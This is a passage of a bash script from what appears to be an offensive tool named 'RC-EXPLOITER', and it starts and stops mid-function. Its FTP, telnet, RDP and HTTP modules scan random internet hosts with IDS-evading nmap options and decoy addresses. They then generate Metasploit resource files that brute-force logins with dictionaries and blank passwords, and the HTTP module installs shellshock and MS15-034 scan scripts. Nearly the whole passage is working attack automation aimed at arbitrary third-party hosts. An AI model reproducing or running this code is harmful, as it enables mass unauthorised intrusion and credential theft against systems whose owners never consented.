     nmap $IdS -T4 -iR $NUM -D $SPooF,$IP -PN -n -p 21 --open --reason -oN $IPATH/logs/Random-Hosts[FTP].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 21\nLOGFILE: Random-Hosts[FTP].log\nUSING DECOY: $SPooF\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     else
     # default (dont use decoys)
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -PN -n -p 21 --open --reason -oN $IPATH/logs/Random-Hosts[FTP].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 21\nLOGFILE: Random-Hosts[FTP].log\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     fi

     echo ""
     # display on screen hosts found
     cat $IPATH/logs/Random-Hosts[FTP].log
     echo ""

       # generate (settings) resource file
       rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
         if [ "$?" -eq "0" ]; then
       echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
       sleep 1
       echo "hosts -d" > $IPATH/db/msfdb.rc
       echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg USER_FILE $dIc" >> $IPATH/db/msfdb.rc
       echo "setg PASS_FILE $dIc" >> $IPATH/db/msfdb.rc
       echo "setg THREADS 30" >> $IPATH/db/msfdb.rc
       echo "setg BRUTEFORCE_SPEED 3" >> $IPATH/db/msfdb.rc
       echo "setg BLANK_PASSWORDS true" >> $IPATH/db/msfdb.rc
       echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[ftp].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

       echo "resource $IPATH/exploits/ftp.rc" >> $IPATH/db/msfdb.rc
       chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1
       chown $user $IPATH/logs/Random-Hosts[FTP].log > /dev/null 2>&1


         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp ftp.rc ftp.bk > /dev/null 2<&1
         sed -i "s|FlAg|$IdS|g" ftp.rc
         cd $IPATH

      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[ftp].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi

  # clean old files
  mv $IPATH/exploits/ftp.bk $IPATH/exploits/ftp.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/ftp.rc > /dev/null 2>&1


  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi



   elif [ "$aTv" = "input RHOSTS manually" ]; then
  # imput manually RHOSTS
  rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then
     dIc=$(zenity --title "☠ BRUTE FORCE DICIONARY PATH ☠" --filename=$IPATH --file-selection --text "chose dicionary file to use\nexample: $IPATH/bin/user-passw.txt") > /dev/null 2>&1

    # generate (settings) resource file
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
    sleep 1

       if [ "$OutPuT" = "YES" ]; then
         echo "hosts -d" > $IPATH/db/msfdb.rc
         echo "spool $IPATH/logs/[ftp].log" >> $IPATH/db/msfdb.rc
       else
         echo "hosts -d" > $IPATH/db/msfdb.rc
       fi

    echo "hosts -d" > $IPATH/db/msfdb.rc
    echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
    echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
    echo "setg USER_FILE $dIc" >> $IPATH/db/msfdb.rc
    echo "setg PASS_FILE $dIc" >> $IPATH/db/msfdb.rc
    echo "setg THREADS 30" >> $IPATH/db/msfdb.rc
    echo "setg BRUTEFORCE_SPEED 3" >> $IPATH/db/msfdb.rc
    echo "setg BLANK_PASSWORDS true" >> $IPATH/db/msfdb.rc
    echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[ftp].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

    echo "resource $IPATH/exploits/ftp.rc" >> $IPATH/db/msfdb.rc
    chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1


         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp ftp.rc ftp.bk > /dev/null 2<&1
         sed -i "s|FlAg|$IdS|g" ftp.rc
         cd $IPATH


      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[ftp].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi

  # clean old files
  mv $IPATH/exploits/ftp.bk $IPATH/exploits/ftp.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/ftp.rc > /dev/null 2>&1

  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi


else

   Colors;
   echo ${RedF}[x]☠ quiting module... ${Reset};
   sleep 2
fi
}






# ----------------
# telnet exploiter
# ----------------
sh_7 () {
Colors;
# search in wan OR manually input rhosts
aTv=$(zenity --list --title "☠ ATTACK VECTOR ☠" --text "Available scans" --radiolist --column "Pick" --column "Option" TRUE "Scan WAN for hosts" FALSE "input RHOSTS manually" --width 350 --height 165) > /dev/null 2>&1
# sellect IDS evading port scanning technic to use ...
IdS=$(zenity --list --title "☠ IDS EVADING TECHNIC ☠" --text "\nAvailable port scans:" --radiolist --column "Pick" --column "Option" TRUE "TCP Stealth scan (default)" FALSE "TCP Null Scan" FALSE "TCP Fin scan" FALSE "TCP Xmas scan" FALSE "fragmented packets" --width 320 --height 270) > /dev/null 2>&1

# IDS evading port scanning technic to use
if [ "$IdS" = "TCP Stealth scan (default)" ]; then
  IdS="-sS"
elif [ "$IdS" = "TCP Null Scan" ]; then
  IdS="-sN"
elif [ "$IdS" = "TCP Fin scan" ]; then
  IdS="-sF"
elif [ "$IdS" = "TCP Xmas scan" ]; then
  IdS="-sX"
elif [ "$IdS" = "fragmented packets" ]; then
  IdS="-f"
fi


   if [ "$aTv" = "Scan WAN for hosts" ]; then
     NUM=$(zenity --title "☠ Nº LIMIT OF HOSTS TO FOUND ☠" --text "Input the maximus nunber of random IP's to found\nChose from 1 to 1024 random hosts to found" --entry --width 350) > /dev/null 2>&1
     dIc=$(zenity --title "☠ BRUTE FORCE DICIONARY PATH ☠" --filename=$IPATH --file-selection --text "chose dicionary file to use\nexample: $IPATH/bin/user-passw.txt") > /dev/null 2>&1

     # use DECOY'S in scanning WAN networks?
     if [ "$ChE" = "YES" ]; then
     # use decoys to scan wan networks
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -D $SPooF,$IP -PN -n -p 23 --open -oN $IPATH/logs/Random-Hosts[telnet].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 23\nLOGFILE: Random-Hosts[telnet].log\nUSING DECOY: $SPooF\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     else
     # default (dont use decoys)
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -PN -n -p 23 --open -oN $IPATH/logs/Random-Hosts[telnet].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 23\nLOGFILE: Random-Hosts[telnet].log\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     fi


     echo ""
     # display on screen hosts found
     cat $IPATH/logs/Random-Hosts[telnet].log
     echo ""

       # generate (settings) resource file
       rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
         if [ "$?" -eq "0" ]; then
       echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
       sleep 1
       echo "hosts -d" > $IPATH/db/msfdb.rc
       echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg USER_FILE $dIc" >> $IPATH/db/msfdb.rc
       echo "setg PASS_FILE $dIc" >> $IPATH/db/msfdb.rc
       echo "setg THREADS 30" >> $IPATH/db/msfdb.rc
       echo "setg BRUTEFORCE_SPEED 3" >> $IPATH/db/msfdb.rc
       echo "setg BLANK_PASSWORDS true" >> $IPATH/db/msfdb.rc
       echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[telnet].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

       echo "resource $IPATH/exploits/telnet.rc" >> $IPATH/db/msfdb.rc
       chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1
       chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1
       chown $user $IPATH/logs/Random-Hosts[telnet].log > /dev/null 2>&1


         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp telnet.rc telnet.bk > /dev/null 2<&1
         sed -i "s|R3PL4C3|$dIc|g" telnet.rc
         sed -i "s|FlAg|$IdS|g" telnet.rc
         cd $IPATH


      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[telnet].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi

  # clean old files
  rm $IPATH/exploits/copy.int > /dev/null 2<&1
  mv $IPATH/exploits/telnet.bk $IPATH/exploits/telnet.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/telnet.rc > /dev/null 2>&1

  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi


   elif [ "$aTv" = "input RHOSTS manually" ]; then
  # imput manually RHOSTS
  rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then
     dIc=$(zenity --title "☠ BRUTE FORCE DICIONARY PATH ☠" --filename=$IPATH --file-selection --text "chose dicionary file to use\nexample: $IPATH/bin/user-passw.txt") > /dev/null 2>&1

    # generate (settings) resource file
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
    sleep 1
    echo "hosts -d" > $IPATH/db/msfdb.rc
    echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
    echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
    echo "setg USER_FILE $dIc" >> $IPATH/db/msfdb.rc
    echo "setg PASS_FILE $dIc" >> $IPATH/db/msfdb.rc
    echo "setg THREADS 30" >> $IPATH/db/msfdb.rc
    echo "setg BRUTEFORCE_SPEED 3" >> $IPATH/db/msfdb.rc
    echo "setg BLANK_PASSWORDS true" >> $IPATH/db/msfdb.rc
    echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[telnet].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

    echo "resource $IPATH/exploits/telnet.rc" >> $IPATH/db/msfdb.rc
    chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1


         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp telnet.rc telnet.bk > /dev/null 2<&1
         sed -i "s|R3PL4C3|$dIc|g" telnet.rc
         sed -i "s|FlAg|$IdS|g" telnet.rc
         cd $IPATH

      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits  [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[telnet].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi

  # clean old files
  rm $IPATH/exploits/copy.int > /dev/null 2<&1
  mv $IPATH/exploits/telnet.bk $IPATH/exploits/telnet.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/telnet.rc > /dev/null 2>&1

  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi


else

   Colors;
   echo ${RedF}[x]☠ quiting module... ${Reset};
   sleep 2
fi
}






# -------------
# RDP exploiter
# -------------
sh_8 () {
Colors;
# search in wan OR manually input rhosts
aTv=$(zenity --list --title "☠ ATTACK VECTOR ☠" --text "Available scans" --radiolist --column "Pick" --column "Option" TRUE "Scan WAN for hosts" FALSE "input RHOSTS manually" --width 350 --height 165) > /dev/null 2>&1
# sellect IDS evading port scanning technic to use ...
IdS=$(zenity --list --title "☠ IDS EVADING TECHNIC ☠" --text "\nAvailable port scans:" --radiolist --column "Pick" --column "Option" TRUE "TCP Stealth scan (default)" FALSE "TCP Null Scan" FALSE "TCP Fin scan" FALSE "TCP Xmas scan" FALSE "fragmented packets" --width 320 --height 270) > /dev/null 2>&1

# IDS evading port scanning technic to use
if [ "$IdS" = "TCP Stealth scan (default)" ]; then
  IdS="-sS"
elif [ "$IdS" = "TCP Null Scan" ]; then
  IdS="-sN"
elif [ "$IdS" = "TCP Fin scan" ]; then
  IdS="-sF"
elif [ "$IdS" = "TCP Xmas scan" ]; then
  IdS="-sX"
elif [ "$IdS" = "fragmented packets" ]; then
  IdS="-f"
fi


   if [ "$aTv" = "Scan WAN for hosts" ]; then
     NUM=$(zenity --title "☠ Nº LIMIT OF HOSTS TO FOUND ☠" --text "Input the maximus nunber of random IP's to found\nChose from 1 to 1024 random hosts to found" --entry --width 350) > /dev/null 2>&1

     # use DECOY'S in scanning WAN networks?
     if [ "$ChE" = "YES" ]; then
     # use decoys to scan wan networks
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -D $SPooF,$IP -PN -n -p 3389 --open --reason -oN $IPATH/logs/Random-Hosts[rdp].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 3389\nLOGFILE: Random-Hosts[rdp].log\nUSING DECOY: $SPooF\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     else
     # default (dont use decoys)
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -PN -n -p 3389 --open --reason -oN $IPATH/logs/Random-Hosts[rdp].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 3389\nLOGFILE: Random-Hosts[rdp].log\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     fi

     echo ""
     # display on screen hosts found
     cat $IPATH/logs/Random-Hosts[rdp].log
     echo ""

       # generate (settings) resource file
       rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
         if [ "$?" -eq "0" ]; then
       echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
       sleep 1
       echo "hosts -d" > $IPATH/db/msfdb.rc
       echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[rdp].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

       echo "resource $IPATH/exploits/rdp.rc" >> $IPATH/db/msfdb.rc
       chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1
       chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1
       chown $user $IPATH/logs/Random-Hosts[rdp].log > /dev/null 2>&1


         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp rdp.rc rdp.bk > /dev/null 2<&1
         sed -i "s|FlAg|$IdS|g" rdp.rc
         cd $IPATH


      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits  [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[rdp].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi

  # clean old files
  mv $IPATH/exploits/rdp.bk $IPATH/exploits/rdp.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/rdp.rc > /dev/null 2>&1

  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi



   elif [ "$aTv" = "input RHOSTS manually" ]; then
  # imput manually RHOSTS
  rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
     if [ "$?" -eq "0" ]; then

    # generate (settings) resource file
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
    sleep 1
    echo "hosts -d" > $IPATH/db/msfdb.rc
    echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
    echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[rdp].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

    echo "resource $IPATH/exploits/rdp.rc" >> $IPATH/db/msfdb.rc
    chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1


         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp rdp.rc rdp.bk > /dev/null 2<&1
         sed -i "s|FlAg|$IdS|g" rdp.rc
         cd $IPATH


      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits  [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[rdp].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi


  # clean old files
  mv $IPATH/exploits/rdp.bk $IPATH/exploits/rdp.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/rdp.rc > /dev/null 2>&1

  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi


else

   Colors;
   echo ${RedF}[x]☠ quiting module... ${Reset};
   sleep 2
fi
}






# --------------
# HTTP exploiter
# --------------
sh_9 () {
Colors;
# search in wan OR manually input rhosts
aTv=$(zenity --list --title "☠ ATTACK VECTOR ☠" --text "Available scans" --radiolist --column "Pick" --column "Option" TRUE "Scan WAN for hosts" FALSE "input RHOSTS manually" --width 350 --height 165) > /dev/null 2>&1
# sellect IDS evading port scanning technic to use ...
IdS=$(zenity --list --title "☠ IDS EVADING TECHNIC ☠" --text "\nAvailable port scans:" --radiolist --column "Pick" --column "Option" TRUE "TCP Stealth scan (default)" FALSE "TCP Null Scan" FALSE "TCP Fin scan" FALSE "TCP Xmas scan" FALSE "fragmented packets" --width 320 --height 270) > /dev/null 2>&1

# IDS evading port scanning technic to use
if [ "$IdS" = "TCP Stealth scan (default)" ]; then
  IdS="-sS"
elif [ "$IdS" = "TCP Null Scan" ]; then
  IdS="-sN"
elif [ "$IdS" = "TCP Fin scan" ]; then
  IdS="-sF"
elif [ "$IdS" = "TCP Xmas scan" ]; then
  IdS="-sX"
elif [ "$IdS" = "fragmented packets" ]; then
  IdS="-f"
fi


   if [ "$aTv" = "Scan WAN for hosts" ]; then
     NUM=$(zenity --title "☠ Nº LIMIT OF HOSTS TO FOUND ☠" --text "Input the maximus nunber of random IP's to found\nChose from 1 to 1024 random hosts to found" --entry --width 350) > /dev/null 2>&1


     # use DECOY'S in scanning WAN networks?
     if [ "$ChE" = "YES" ]; then
     # use decoys to scan wan networks
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -D $SPooF,$IP -PN -n -p 80 --open --reason -oN $IPATH/logs/Random-Hosts[http].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 80\nLOGFILE: Random-Hosts[http].log\nUSING DECOY: $SPooF\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     else
     # default (dont use decoys)
     echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Scanning [${GreenF}WAN${white}] network... ${Reset};
     nmap $IdS -T4 -iR $NUM -PN -n -p 80 --open --reason -oN $IPATH/logs/Random-Hosts[http].log | zenity --progress --pulsate --title "☠ SCANNING WAN NETWORK ☠" --text="FIND: $NUM ONLY: open PORTS: 80\nLOGFILE: Random-Hosts[http].log\nSPOOFED MAC: $st\n\nScanning 1024 random hosts..." --percentage=0 --auto-close --width 330 > /dev/null 2>&1
     fi

     echo ""
     # display on screen hosts found
     cat $IPATH/logs/Random-Hosts[http].log
     echo ""

       # generate (settings) resource file
       rhosts=$(zenity --title="☠ Input RHOSTS ☠" --text "To input more than one target (RHOSTS)\njust seperate then by a blank space...\n\nexample: 192.44.100.86 182.11.100.23" --entry --width 360) > /dev/null 2>&1
         if [ "$?" -eq "0" ]; then
       echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Building rc files. [${GreenF}OK${white}] ${Reset};
       sleep 1
       echo "hosts -d" > $IPATH/db/msfdb.rc
       echo "hosts -a $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg RHOSTS $rhosts" >> $IPATH/db/msfdb.rc
       echo "setg THREADS 30" >> $IPATH/db/msfdb.rc
       echo "setg TARGETURI /cgi-bin/printenv.cgi" >> $IPATH/db/msfdb.rc
       echo "setg BRUTEFORCE_SPEED 3" >> $IPATH/db/msfdb.rc
       echo "setg BLANK_PASSWORDS true" >> $IPATH/db/msfdb.rc
       echo "setg STOP_ON_SUCCESS true" >> $IPATH/db/msfdb.rc

       if [ "$OutPuT" = "YES" ]; then
         echo "spool $IPATH/logs/[http].log" >> $IPATH/db/msfdb.rc
       else
         echo "good" > /dev/null 2>&1
       fi

       echo "resource $IPATH/exploits/http.rc" >> $IPATH/db/msfdb.rc
       chown $user $IPATH/db/msfdb.rc > /dev/null 2>&1
       chown $user $IPATH/logs/Random-Hosts[http].log > /dev/null 2>&1

         cd $IPATH/exploits/
         # using bash SED to replace values in exploit.rc
         cp http.rc http.bk > /dev/null 2<&1
         sed -i "s|FlAg|$IdS|g" http.rc
         cd $IPATH



        # check if exists nmap scripts folder
        if [ -d $nSeS ]; then
            # copy nse scripts and lua lib to nmap directory
            echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Updating nse database.. ${Reset};
            sleep 1
            cp $IPATH/bin/file-checker.nse $nSeS/file-checker.nse
            cp $IPATH/bin/http-shellshock.nse $nSeS/http-shellshock.nse
            cp $IPATH/bin/ms15-034.nse $nSeS/ms15-034.nse
            cp $IPATH/bin/phpipam.nse $nSeS/phpipam.nse

        else

          # error nse folder not found
          echo ${RedF}[x]☠ [ERROR][ NSE FOLDER NOT FOUND UNDER ] ${Reset};
          echo ${RedF}[x]☠ [PATH=][ $nSeS ] ${Reset};
          sleep 2
          # manually input NSE folders path and metasploit nmap path
         qU=$(zenity --title "☠ INPUT NSE SCRIPTS INSTALL PATH ☠" --text "example: /usr/share/nmap/scripts" --entry --width 350) > /dev/null 2>&1
          echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Updating nse database.. ${Reset};
          # copy files to its rigth place in nmapdb and msfdb
          cp $IPATH/bin/file-checker.nse $qU/file-checker.nse
          cp $IPATH/bin/http-shellshock.nse $qU/http-shellshock.nse
          cp $IPATH/bin/ms15-034.nse $qU/ms15-034.nse
          cp $IPATH/bin/phpipam.nse $qU/phpipam.nse
        fi


      # update NSE database befor running resource files
      nmap --script-updatedb > /dev/null 2>&1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ NSE db updated ...     [${GreenF}OK${white}] ${Reset};
      sleep 1


      # start postgresql+metasploit db
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Selecting exploits  [${GreenF}OK${white}] ${Reset};
      sleep 1
      echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ Starting msfconsole ... ${Reset};
      sleep 1


    # access msfdatabase
    xterm -T "METASPLOIT CONSOLE" -geometry 115x23 -e "sudo msfconsole -r $IPATH/db/msfdb.rc"
    echo ${BlueF}[${GreenF}✔${BlueF}]${white}☠ 'return' to main menu ... ${Reset};
    if [ "$OutPuT" = "YES" ]; then
      zenity --warning --title="☠ RC-EXPLOITER GENERATED FILES ☠" --text "logfile: $IPATH/logs/[http].log" --width 480 > /dev/null 2>&1
    else
      echo "good" > /dev/null 2>&1
      sleep 1
    fi


  # clean old files
  rm $IPATH/exploits/copy.int > /dev/null 2<&1
  mv $IPATH/exploits/http.bk $IPATH/exploits/http.rc > /dev/null 2<&1
  chown $user $IPATH/exploits/http.rc > /dev/null 2>&1

  else
  echo ${RedF}[x]☠ [ current task aborted ]${Reset};
  sleep 2
  fi



   elif [ "$aTv" = "input RHOSTS manually" ]; then
  # imput manually RHOSTS
